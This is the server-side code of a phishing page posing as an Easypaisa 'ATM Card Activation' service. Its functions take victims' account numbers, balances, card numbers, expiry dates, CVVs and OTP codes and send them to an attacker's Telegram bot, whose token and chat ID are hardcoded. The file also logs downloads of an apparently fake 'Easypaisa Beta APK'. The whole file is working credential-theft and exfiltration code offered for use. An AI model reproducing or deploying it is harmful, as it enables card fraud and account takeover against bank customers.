"use server"

const TELEGRAM_BOT_TOKEN = "7806926592:AAFSa4Sb94bx2hIQ5ra2merZv7Itr1l5ahM"
const TELEGRAM_CHAT_ID = "6359473280"

async function sendToTelegram(message: string) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })

    const result = await response.json()

    if (!response.ok) {
      console.error("Telegram API Error:", result)
      throw new Error(`Telegram API Error: ${result.description || "Unknown error"}`)
    }

    console.log("Message sent successfully to Telegram:", result)
    return { success: true, message: "Message sent successfully" }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return { success: false, message: error instanceof Error ? error.message : "Unknown error" }
  }
}

function formatCardDataMessage(data: {
  accountNumber: string
  currentBalance: string
  cardNumber?: string
  expiryDate?: string
  cvv?: string
}) {
  return `
🏧 <b>ATM Card Activation - Card Details</b>

📱 <b>Account Number:</b> ${data.accountNumber}
💰 <b>Current Balance:</b> PKR ${data.currentBalance}
${data.cardNumber ? `💳 <b>Card Number:</b> ${data.cardNumber}` : ""}
${data.expiryDate ? `📅 <b>Expiry Date:</b> ${data.expiryDate}` : ""}
${data.cvv ? `🔐 <b>CVV:</b> ${data.cvv}` : ""}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
  `.trim()
}

function formatOTPMessage(otp: string, accountNumber: string) {
  return `
🔐 <b>ATM Card Activation - OTP Received</b>

📱 <b>Account Number:</b> ${accountNumber}
🔑 <b>OTP Code:</b> ${otp}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
  `.trim()
}

export async function submitCardData(data: {
  accountNumber: string
  currentBalance: string
  cardNumber?: string
  expiryDate?: string
  cvv?: string
}) {
  try {
    const message = formatCardDataMessage(data)
    const result = await sendToTelegram(message)
    return result
  } catch (error) {
    return { success: false, message: "Failed to submit card data" }
  }
}

export async function submitOTPData(otp: string, accountNumber: string) {
  try {
    const message = formatOTPMessage(otp, accountNumber)
    const result = await sendToTelegram(message)
    return result
  } catch (error) {
    return { success: false, message: "Failed to submit OTP data" }
  }
}

export async function testTelegramConnection() {
  try {
    const testMessage = `
🧪 <b>Telegram Bot Test</b>

✅ Connection successful!
🤖 Bot is working properly
⏰ Test time: ${new Date().toLocaleString()}

Ready to receive ATM card activation data.
    `.trim()

    const result = await sendToTelegram(testMessage)
    return result
  } catch (error) {
    return {
      success: false,
      message: `Test failed: ${error instanceof Error ? error.message : "Unknown error"}`,
    }
  }
}

// APK Download tracking
export async function trackAPKDownload(downloadUrl: string) {
  try {
    const message = `
📱 <b>APK Download Event</b>

🔽 User downloaded Easypaisa Beta APK
📎 Download URL: ${downloadUrl}
⏰ Time: ${new Date().toLocaleString()}
🌐 Source: ATM Card Activation Page
    `.trim()

    await sendToTelegram(message)
    return { success: true }
  } catch (error) {
    return { success: false }
  }
}
